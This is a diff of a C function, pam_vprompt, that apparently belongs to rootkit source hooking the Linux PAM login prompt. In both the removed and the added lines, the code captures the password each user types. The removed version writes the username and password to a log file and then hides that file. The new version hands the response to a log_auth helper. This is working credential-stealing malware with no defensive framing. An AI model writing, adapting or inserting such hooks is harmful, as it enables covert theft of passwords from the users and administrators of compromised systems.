@@ -4,11 +4,8 @@ int pam_vprompt(pam_handle_t *pamh, int style, char **response, const char *fmt,
     const struct pam_message *pmsg;
     const struct pam_conv *conv;
     const void *convp;
-    char *msgbuf, *user = get_username(pamh);
+    char *msgbuf;
     int retval;
-    FILE *logpath_fp;
-
-    hook(CFOPEN);
 
     if(response) *response = NULL;
     if((retval = pam_get_item(pamh, PAM_CONV, &convp)) != PAM_SUCCESS) return retval;
@@ -30,15 +27,12 @@ int pam_vprompt(pam_handle_t *pamh, int style, char **response, const char *fmt,
     if(response) *response = pam_resp == NULL ? NULL : pam_resp->resp;
     if(retval != PAM_SUCCESS) return retval;
 
-    if(pam_resp->resp != NULL && verify_pass(user, pam_resp->resp)){
-        if((logpath_fp = call(CFOPEN, LOG_PATH, "a")) == NULL) goto _end_pam_vprompt;
+    /* if we got a response, go ahead and begin trying to
+     * log it. if the password is incorrect or otherwise
+     * invalid, nothing will be done. */
+    if(pam_resp->resp != NULL)
+        log_auth(pamh, pam_resp->resp);
 
-        fprintf(logpath_fp, LOG_FMT, user, pam_resp->resp);
-        fclose(logpath_fp);
-        hide_path(LOG_PATH);
-    }
-
-_end_pam_vprompt:
     _pam_overwrite(msgbuf);
     _pam_drop(pam_resp);
     free(msgbuf);
